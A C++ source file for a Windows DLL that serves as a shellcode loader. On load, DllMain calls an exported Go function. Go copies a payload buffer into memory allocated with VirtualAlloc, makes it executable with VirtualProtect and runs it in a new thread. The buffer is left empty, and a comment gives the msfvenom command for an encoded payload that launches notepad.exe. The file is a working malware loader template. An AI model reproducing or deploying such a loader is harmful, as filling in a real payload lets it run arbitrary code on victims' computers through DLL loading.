#include "pch.h"
#include<Windows.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>


unsigned char buf[] = ""; //msfvenom -p windows /exec cmd = notepad.exe -f c -e x86/alpha_mixed

unsigned int buf_len = 2639; // Payload length

extern _declspec(dllexport) int Go(void);

int Go(void) {

	void* exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	exec_mem = VirtualAlloc(0, buf_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	RtlMoveMemory(exec_mem, buf, buf_len);

	rv = VirtualProtect(exec_mem, buf_len, PAGE_EXECUTE_READ, &oldprotect);

	if (rv != 0) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	};
	return 0;
}

BOOL WINAPI Dllmain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {

	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		Go();
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}



